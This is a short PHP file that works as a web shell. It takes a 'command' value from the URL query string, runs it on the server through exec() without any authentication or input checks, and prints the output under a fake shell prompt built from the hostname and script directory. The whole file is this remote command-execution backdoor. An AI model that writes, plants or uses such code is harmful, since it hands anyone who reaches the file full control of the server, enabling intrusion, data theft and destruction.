<?php

$command = $_GET["command"];
$syntax = gethostname()."@".str_replace("\\", "/", __DIR__)."$ $command <BR>";
if(empty($command))
{
    echo $syntax."<p>Command no found<p>";
    return;
}
$return = exec($command, $ff);

if (empty($ff))
{
    echo $syntax."<p>Command no found<p>";
    return;
}

if (is_array($ff))
{
    foreach ($ff as $value)
    {
        $syntax .= "<p>".$value."<p>";
    }
}
$return = (is_array($return)) ? $syntax : $syntax.$return;

echo "<p>". $return ."<p>";


